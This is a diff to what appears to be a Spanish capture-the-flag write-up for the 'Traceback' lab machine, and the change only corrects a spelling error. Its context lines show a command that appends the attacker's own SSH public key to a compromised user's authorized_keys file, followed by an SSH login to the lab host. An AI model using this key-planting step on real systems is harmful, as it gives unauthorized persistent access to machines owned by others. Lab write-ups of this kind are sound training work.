@@ -102,7 +102,7 @@ sysadmin@traceback:~/.ssh$ ls
 authorized_keys
 sysadmin@traceback:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCn7R0arHChLrr5PHe6+2lqMwfmftFctUTszf43NZpfEdy+AKL1CDLhHD8dyBRlwK5rwgSaBw0fI0wUoaYMpj2WbZVNnQlfHg+SGH/9zE5yLyIomHxD874qTzc80fbqHlY7+WobG9AHMcemEdrGe6c1Z7PJ3JLTf8WB4gXLQdlPsDrHpOBy7HRmWdZsnh74sribeRGV2R//EXPMrjjD+a7Sz0DWZBamruK+pvh2qJk13T/Xe6mf+EWnO/ysi7TsqPxZ3Xg66Mcel4dSkBqB9m4ehKYLVB6b6cWrU3v1o4DWWtRIlnJ3XJYqK2ZWQ2WfVkLQSF04o7p1tyoOY244UWu9m3xgdwB416r7tY9+9GxgFdN2J1SHCMBVLq+pYYhkLJvbe4X7bZS********************************************************************************************** kali@kali" >> authorized_keys
 ```
-Una vez hecho esto pude conectarme a la maquina a travez de ssh.
+Una vez hecho esto pude conectarme a la maquina a traves de ssh.
 ```bash
 ssh sysadmin@10.129.193.96
 The authenticity of host '10.129.193.96 (10.129.193.96)' can't be established.
